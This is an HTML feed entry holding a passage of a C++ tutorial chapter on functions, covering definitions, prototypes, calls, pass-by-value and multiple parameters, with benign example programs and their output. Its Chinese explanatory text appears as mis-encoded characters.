        <content type="html"><![CDATA[<h2 id="7-1-å¤ä¹ å‡½æ•°çš„åŸºæœ¬çŸ¥è¯†"><a href="#7-1-å¤ä¹ å‡½æ•°çš„åŸºæœ¬çŸ¥è¯†" class="headerlink" title="7.1 å¤ä¹ å‡½æ•°çš„åŸºæœ¬çŸ¥è¯†"></a>7.1 å¤ä¹ å‡½æ•°çš„åŸºæœ¬çŸ¥è¯†</h2><p>å‡½æ•°æ˜¯ C++ ç¨‹åºçš„åŸºæœ¬æ„å»ºå—ï¼Œå®ƒä»¬å…è®¸æˆ‘ä»¬å°†ä»£ç ç»„ç»‡æˆå¯é‡ç”¨çš„ã€é€»è¾‘ç‹¬ç«‹çš„å•å…ƒã€‚ä½¿ç”¨å‡½æ•°å¯ä»¥ä½¿ç¨‹åºæ›´æ¨¡å—åŒ–ã€æ›´æ˜“äºç†è§£å’Œç»´æŠ¤ã€‚æœ¬èŠ‚å°†å¤ä¹ å‡½æ•°çš„åŸºæœ¬æ¦‚å¿µï¼šå®šä¹‰ã€åŸå‹å’Œè°ƒç”¨ã€‚</p><h3 id="7-1-1-å®šä¹‰å‡½æ•°"><a href="#7-1-1-å®šä¹‰å‡½æ•°" class="headerlink" title="7.1.1 å®šä¹‰å‡½æ•°"></a>7.1.1 å®šä¹‰å‡½æ•°</h3><p><strong>å‡½æ•°å®šä¹‰ (Function Definition)</strong> åŒ…å«äº†å‡½æ•°çš„å®é™…ä»£ç ï¼Œå®ƒè¯´æ˜äº†å‡½æ•°åšä»€ä¹ˆä»¥åŠå¦‚ä½•åšã€‚ä¸€ä¸ªå‡½æ•°å®šä¹‰åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š</p><ol><li> <strong>è¿”å›ç±»å‹ (Return Type):</strong> å‡½æ•°æ‰§è¡Œå®Œæ¯•åè¿”å›ç»™è°ƒç”¨è€…çš„å€¼çš„ç±»å‹ã€‚å¦‚æœå‡½æ•°ä¸è¿”å›ä»»ä½•å€¼ï¼Œåˆ™è¿”å›ç±»å‹ä¸º <code>void</code>ã€‚</li><li> <strong>å‡½æ•°å (Function Name):</strong> ç”¨äºè°ƒç”¨å‡½æ•°çš„æ ‡è¯†ç¬¦ã€‚å‘½åè§„åˆ™ä¸å˜é‡åç›¸åŒã€‚</li><li> <strong>å‚æ•°åˆ—è¡¨ (Parameter List):</strong> ä½äºå‡½æ•°ååçš„åœ†æ‹¬å· <code>()</code> ä¸­ï¼Œç”¨äºæ¥æ”¶ä¼ é€’ç»™å‡½æ•°çš„å€¼ã€‚å‚æ•°ä¹‹é—´ç”¨é€—å·åˆ†éš”ï¼Œæ¯ä¸ªå‚æ•°éƒ½éœ€è¦æŒ‡å®šç±»å‹å’Œåç§°ã€‚å¦‚æœå‡½æ•°ä¸æ¥å—ä»»ä½•å‚æ•°ï¼Œæ‹¬å·å†…å¯ä»¥ä¸ºç©ºæˆ–å†™ <code>void</code>ã€‚</li><li> <strong>å‡½æ•°ä½“ (Function Body):</strong> ä½äºèŠ±æ‹¬å· <code>&#123;&#125;</code> ä¸­ï¼ŒåŒ…å«å®ç°å‡½æ•°åŠŸèƒ½çš„ C++ è¯­å¥ã€‚</li></ol><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">return_type <span class="title">function_name</span><span class="params">(parameter_list)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å‡½æ•°ä½“ï¼šåŒ…å«æ‰§è¡Œä»»åŠ¡çš„è¯­å¥</span></span><br><span class="line">    <span class="comment">// å¦‚æœ return_type ä¸æ˜¯ voidï¼Œåˆ™éœ€è¦ return è¯­å¥è¿”å›å€¼</span></span><br><span class="line">    <span class="keyword">return</span> value; <span class="comment">// (å¦‚æœ return_type ä¸æ˜¯ void)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ï¼šå®šä¹‰ä¸€ä¸ªç®€å•çš„å‡½æ•°</strong></p><p>è¿™ä¸ªå‡½æ•°ä¸æ¥å—å‚æ•°ï¼Œä¹Ÿä¸è¿”å›å€¼ (<code>void</code>)ï¼Œåªæ˜¯æ‰“å°ä¸€æ¡æ¶ˆæ¯ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å®šä¹‰</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_greeting</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello from the function!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// è°ƒç”¨å‡½æ•°</span></span><br><span class="line">    print_greeting();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ï¼šå®šä¹‰ä¸€ä¸ªå¸¦å‚æ•°å¹¶è¿”å›å€¼çš„å‡½æ•°</strong></p><p>è¿™ä¸ªå‡½æ•°æ¥å—ä¸¤ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°ï¼Œå¹¶è¿”å›å®ƒä»¬çš„å’Œã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å®šä¹‰</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_numbers</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = num1 + num2;</span><br><span class="line">    <span class="keyword">return</span> sum; <span class="comment">// è¿”å›è®¡ç®—ç»“æœ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">3</span>;</span><br><span class="line">    <span class="comment">// è°ƒç”¨å‡½æ•°å¹¶å°†è¿”å›å€¼å­˜å‚¨åœ¨ result å˜é‡ä¸­</span></span><br><span class="line">    <span class="keyword">int</span> result = add_numbers(a, b);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The sum of &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot; is: &quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: The sum of 5 and 3 is: 8</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-1-2-å‡½æ•°åŸå‹å’Œå‡½æ•°è°ƒç”¨"><a href="#7-1-2-å‡½æ•°åŸå‹å’Œå‡½æ•°è°ƒç”¨" class="headerlink" title="7.1.2 å‡½æ•°åŸå‹å’Œå‡½æ•°è°ƒç”¨"></a>7.1.2 å‡½æ•°åŸå‹å’Œå‡½æ•°è°ƒç”¨</h3><p><strong>å‡½æ•°åŸå‹ (Function Prototype)</strong> ä¹Ÿç§°ä¸ºå‡½æ•°å£°æ˜ (Function Declaration)ï¼Œå®ƒå‘Šè¯‰ç¼–è¯‘å™¨å‡½æ•°çš„åç§°ã€è¿”å›ç±»å‹ä»¥åŠå‚æ•°åˆ—è¡¨ï¼ˆç±»å‹å’Œé¡ºåºï¼‰ï¼Œä½†ä¸åŒ…å«å‡½æ•°ä½“ã€‚åŸå‹é€šå¸¸æ”¾åœ¨ <code>main()</code> å‡½æ•°ä¹‹å‰æˆ–å•ç‹¬çš„å¤´æ–‡ä»¶ä¸­ã€‚</p><p><strong>ä¸ºä»€ä¹ˆéœ€è¦åŸå‹ï¼Ÿ</strong></p><p>C++ ç¼–è¯‘å™¨åœ¨å¤„ç†ä»£ç æ—¶éœ€è¦â€œé¢„å…ˆçŸ¥é“â€å‡½æ•°çš„æ¥å£ï¼ˆå®ƒæ¥å—ä»€ä¹ˆå‚æ•°ï¼Œè¿”å›ä»€ä¹ˆç±»å‹ï¼‰ï¼Œç„¶åæ‰èƒ½æ­£ç¡®åœ°å¤„ç†å¯¹è¯¥å‡½æ•°çš„è°ƒç”¨ã€‚å¦‚æœå‡½æ•°å®šä¹‰å‡ºç°åœ¨è°ƒç”¨å®ƒçš„ä»£ç ä¹‹åï¼Œç¼–è¯‘å™¨åœ¨é‡åˆ°è°ƒç”¨æ—¶å°±ä¸çŸ¥é“è¯¥å‡½æ•°æ˜¯å¦å­˜åœ¨æˆ–å¦‚ä½•è°ƒç”¨å®ƒï¼Œä»è€Œå¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚å‡½æ•°åŸå‹è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">return_type <span class="title">function_name</span><span class="params">(parameter_type_list)</span></span>; <span class="comment">// æ³¨æ„æœ«å°¾çš„åˆ†å·</span></span><br></pre></td></tr></table></figure><p>å‚æ•°åç§°åœ¨åŸå‹ä¸­æ˜¯å¯é€‰çš„ï¼Œä½†å†™ä¸Šé€šå¸¸èƒ½æé«˜å¯è¯»æ€§ã€‚</p><p><strong>å‡½æ•°è°ƒç”¨ (Function Call)</strong> æ˜¯æŒ‡åœ¨ç¨‹åºä¸­æ‰§è¡Œä¸€ä¸ªå‡½æ•°ã€‚é€šè¿‡ä½¿ç”¨å‡½æ•°åï¼Œå¹¶åœ¨æ‹¬å·ä¸­æä¾›æ‰€éœ€çš„å®é™…å‚æ•°ï¼ˆç§°ä¸º**å®å‚ (Arguments)**ï¼‰æ¥å®Œæˆè°ƒç”¨ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¯¹äºä¸è¿”å›å€¼çš„å‡½æ•°</span></span><br><span class="line">function_name(argument_list);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹äºè¿”å›å€¼çš„å‡½æ•°</span></span><br><span class="line">variable = function_name(argument_list);</span><br><span class="line"><span class="comment">// æˆ–è€…ç›´æ¥åœ¨è¡¨è¾¾å¼ä¸­ä½¿ç”¨</span></span><br><span class="line"><span class="comment">// std::cout &lt;&lt; function_name(argument_list);</span></span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ï¼šä½¿ç”¨å‡½æ•°åŸå‹</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°åŸå‹ (å£°æ˜)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_message</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span>; <span class="comment">// å£°æ˜å‡½æ•°æ¥å£</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">multiply</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;           <span class="comment">// å£°æ˜å‡½æ•°æ¥å£</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å‡½æ•°è°ƒç”¨</span></span><br><span class="line">    display_message(<span class="string">&quot;This is a message.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> num1 = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> num2 = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">int</span> product = multiply(num1, num2); <span class="comment">// è°ƒç”¨å‡½æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The product of &quot;</span> &lt;&lt; num1 &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; num2 &lt;&lt; <span class="string">&quot; is: &quot;</span> &lt;&lt; product &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 42</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å®šä¹‰ (å®ç°) - å¯ä»¥æ”¾åœ¨ main ä¹‹åï¼Œå› ä¸ºåŸå‹å·²ç»æä¾›äº†ä¿¡æ¯</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_message</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å®šä¹‰ (å®ç°)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">multiply</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“:</strong></p><ul><li>  <strong>å‡½æ•°å®šä¹‰:</strong> æä¾›äº†å‡½æ•°çš„å®Œæ•´å®ç°ï¼ˆä»£ç ï¼‰ã€‚</li><li>  <strong>å‡½æ•°åŸå‹:</strong> å£°æ˜äº†å‡½æ•°çš„æ¥å£ï¼ˆåç§°ã€è¿”å›ç±»å‹ã€å‚æ•°ç±»å‹ï¼‰ï¼Œè®©ç¼–è¯‘å™¨çŸ¥é“å¦‚ä½•è°ƒç”¨å®ƒï¼Œé€šå¸¸æ”¾åœ¨è°ƒç”¨ä¹‹å‰ã€‚</li><li>  <strong>å‡½æ•°è°ƒç”¨:</strong> é€šè¿‡å‡½æ•°åå’Œå®å‚æ¥æ‰§è¡Œå‡½æ•°å®šä¹‰çš„ä»£ç ã€‚</li></ul><p>å‡½æ•°æ˜¯æ„å»ºç»“æ„åŒ–å’Œå¯ç»´æŠ¤ C++ ç¨‹åºçš„æ ¸å¿ƒå·¥å…·ã€‚</p><h2 id="7-2-å‡½æ•°å‚æ•°å’ŒæŒ‰å€¼ä¼ é€’"><a href="#7-2-å‡½æ•°å‚æ•°å’ŒæŒ‰å€¼ä¼ é€’" class="headerlink" title="7.2 å‡½æ•°å‚æ•°å’ŒæŒ‰å€¼ä¼ é€’"></a>7.2 å‡½æ•°å‚æ•°å’ŒæŒ‰å€¼ä¼ é€’</h2><p>å‡½æ•°å‚æ•°æ˜¯å‡½æ•°ä¸è°ƒç”¨å®ƒçš„ä»£ç ä¹‹é—´ä¼ é€’ä¿¡æ¯çš„æ¡¥æ¢ã€‚å½“è°ƒç”¨å‡½æ•°æ—¶ï¼Œæˆ‘ä»¬æä¾›çš„å€¼ï¼ˆå®å‚ï¼‰ä¼šè¢«ä¼ é€’ç»™å‡½æ•°å®šä¹‰ä¸­å£°æ˜çš„å˜é‡ï¼ˆå½¢å‚ï¼‰ã€‚C++ é»˜è®¤çš„å‚æ•°ä¼ é€’æ–¹å¼æ˜¯**æŒ‰å€¼ä¼ é€’ (Pass by Value)**ã€‚</p><p><strong>å½¢å‚ (Parameters):</strong> åœ¨å‡½æ•°å®šä¹‰æˆ–å‡½æ•°åŸå‹ä¸­å£°æ˜çš„å˜é‡ï¼Œå®ƒä»¬æ˜¯å‡½æ•°å†…éƒ¨ä½¿ç”¨çš„å±€éƒ¨å˜é‡ï¼Œç”¨äºæ¥æ”¶è°ƒç”¨æ—¶ä¼ å…¥çš„å€¼ã€‚</p><p><strong>å®å‚ (Arguments):</strong> åœ¨å‡½æ•°è°ƒç”¨æ—¶ä¼ é€’ç»™å‡½æ•°çš„å…·ä½“å€¼æˆ–å˜é‡ã€‚</p><p><strong>æŒ‰å€¼ä¼ é€’ (Pass by Value):</strong></p><p>å½“ä½¿ç”¨æŒ‰å€¼ä¼ é€’æ—¶ï¼Œå‡½æ•°ä¼šåˆ›å»ºæ¯ä¸ªå½¢å‚çš„<strong>å‰¯æœ¬</strong>ã€‚è°ƒç”¨å‡½æ•°æ—¶æä¾›çš„å®å‚çš„å€¼ä¼šè¢«å¤åˆ¶åˆ°è¿™äº›æ–°çš„å½¢å‚å˜é‡ä¸­ã€‚å‡½æ•°å†…éƒ¨å¯¹å½¢å‚æ‰€åšçš„ä»»ä½•ä¿®æ”¹éƒ½åªå½±å“è¿™ä¸ªå‰¯æœ¬ï¼Œ<strong>ä¸ä¼š</strong>å½±å“åˆ°å‡½æ•°è°ƒç”¨ä¸­ä½¿ç”¨çš„åŸå§‹å®å‚ã€‚</p><p><strong>ç¤ºä¾‹ï¼šæ¼”ç¤ºæŒ‰å€¼ä¼ é€’</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å®šä¹‰ï¼šæ¥å—ä¸€ä¸ª int å‚æ•° (å½¢å‚ n)</span></span><br><span class="line"><span class="comment">// æŒ‰å€¼ä¼ é€’ï¼Œn æ˜¯ value çš„å‰¯æœ¬</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify_value</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (before modification): n = &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    n = n * <span class="number">2</span>; <span class="comment">// ä¿®æ”¹å½¢å‚ n çš„å€¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (after modification): n = &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>; <span class="comment">// å®å‚</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before calling function: value = &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨å‡½æ•°ï¼Œå°† value çš„å€¼ä¼ é€’ç»™å½¢å‚ n</span></span><br><span class="line">    modify_value(value);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After calling function: value = &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// value çš„å€¼å¹¶æœªæ”¹å˜</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Before calling function: value &#x3D; 10</span><br><span class="line">Inside function (before modification): n &#x3D; 10</span><br><span class="line">Inside function (after modification): n &#x3D; 20</span><br><span class="line">After calling function: value &#x3D; 10</span><br></pre></td></tr></table></figure><p><strong>ä»£ç è§£é‡Š:</strong></p><ol><li> <code>main</code> å‡½æ•°ä¸­çš„å˜é‡ <code>value</code> åˆå§‹åŒ–ä¸º 10ã€‚</li><li> è°ƒç”¨ <code>modify_value(value)</code> æ—¶ï¼Œ<code>value</code> çš„å€¼ (10) è¢«<strong>å¤åˆ¶</strong>ç»™äº† <code>modify_value</code> å‡½æ•°çš„å½¢å‚ <code>n</code>ã€‚</li><li> åœ¨ <code>modify_value</code> å‡½æ•°å†…éƒ¨ï¼Œ<code>n</code> çš„å€¼è¢«ä¿®æ”¹ä¸º 20ã€‚ä½†è¿™ä»…ä»…ä¿®æ”¹äº† <code>n</code> è¿™ä¸ª<strong>å±€éƒ¨å‰¯æœ¬</strong>ã€‚</li><li> å½“å‡½æ•°æ‰§è¡Œå®Œæ¯•è¿”å› <code>main</code> åï¼Œ<code>main</code> å‡½æ•°ä¸­çš„åŸå§‹å˜é‡ <code>value</code> ä»ç„¶æ˜¯ 10ï¼Œæ²¡æœ‰å—åˆ°å‡½æ•°å†…éƒ¨ä¿®æ”¹çš„å½±å“ã€‚</li></ol><p><strong>ä¼˜ç‚¹:</strong></p><ul><li>  <strong>å®‰å…¨æ€§:</strong> ä¿æŠ¤äº†åŸå§‹æ•°æ®ä¸è¢«å‡½æ•°æ„å¤–ä¿®æ”¹ã€‚</li></ul><p><strong>ç¼ºç‚¹:</strong></p><ul><li>  <strong>æ•ˆç‡:</strong> å¯¹äºå¤§å‹æ•°æ®ç»“æ„ï¼ˆå¦‚å¤æ‚çš„ç±»å¯¹è±¡æˆ–ç»“æ„ä½“ï¼‰ï¼Œå¤åˆ¶æ•´ä¸ªå¯¹è±¡å¯èƒ½æ¶ˆè€—è¾ƒå¤šçš„æ—¶é—´å’Œå†…å­˜ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåç»­ç« èŠ‚å°†ä»‹ç»çš„æŒ‰å¼•ç”¨ä¼ é€’æˆ–æŒ‰æŒ‡é’ˆä¼ é€’å¯èƒ½æ›´é«˜æ•ˆã€‚</li></ul><h3 id="7-2-1-å¤šä¸ªå‚æ•°"><a href="#7-2-1-å¤šä¸ªå‚æ•°" class="headerlink" title="7.2.1 å¤šä¸ªå‚æ•°"></a>7.2.1 å¤šä¸ªå‚æ•°</h3><p>å‡½æ•°å¯ä»¥æ¥å—ä»»æ„æ•°é‡çš„å‚æ•°ã€‚åœ¨å‡½æ•°å®šä¹‰å’ŒåŸå‹ä¸­ï¼Œå‚æ•°ä¹‹é—´ç”¨é€—å· <code>,</code> åˆ†éš”ã€‚è°ƒç”¨å‡½æ•°æ—¶ï¼Œæä¾›çš„å®å‚ä¹Ÿå¿…é¡»ç”¨é€—å·åˆ†éš”ï¼Œå¹¶ä¸”æ•°é‡ã€ç±»å‹å’Œé¡ºåºåº”ä¸å½¢å‚åˆ—è¡¨åŒ¹é…ã€‚</p><p><strong>ç¤ºä¾‹ï¼šæ¥å—å¤šä¸ªå‚æ•°çš„å‡½æ•°</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°åŸå‹ï¼šæ¥å—ä¸¤ä¸ª double å’Œä¸€ä¸ª char</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_data</span><span class="params">(<span class="keyword">double</span> length, <span class="keyword">double</span> width, <span class="keyword">char</span> unit)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length: &quot;</span> &lt;&lt; length &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; unit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Width: &quot;</span> &lt;&lt; width &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; unit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Area: &quot;</span> &lt;&lt; length * width &lt;&lt; <span class="string">&quot; sq &quot;</span> &lt;&lt; unit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> len = <span class="number">5.5</span>;</span><br><span class="line">    <span class="keyword">double</span> wid = <span class="number">2.0</span>;</span><br><span class="line">    <span class="keyword">char</span> symbol = <span class="string">&#x27;m&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨å‡½æ•°ï¼Œä¼ é€’ä¸‰ä¸ªå®å‚</span></span><br><span class="line">    display_data(len, wid, symbol);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Length: 5.5 m</span><br><span class="line">Width: 2 m</span><br><span class="line">Area: 11 sq m</span><br></pre></td></tr></table></figure><h3 id="7-2-2-å¦å¤–ä¸€ä¸ªæ¥å—ä¸¤ä¸ªå‚æ•°çš„å‡½æ•°"><a href="#7-2-2-å¦å¤–ä¸€ä¸ªæ¥å—ä¸¤ä¸ªå‚æ•°çš„å‡½æ•°" class="headerlink" title="7.2.2 å¦å¤–ä¸€ä¸ªæ¥å—ä¸¤ä¸ªå‚æ•°çš„å‡½æ•°"></a>7.2.2 å¦å¤–ä¸€ä¸ªæ¥å—ä¸¤ä¸ªå‚æ•°çš„å‡½æ•°</h3><p>ä¸‹é¢æ˜¯å¦ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œè®¡ç®—å¹¶è¿”å›ä¸¤ä¸ªæ•´æ•°ä¸­çš„è¾ƒå¤§å€¼ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 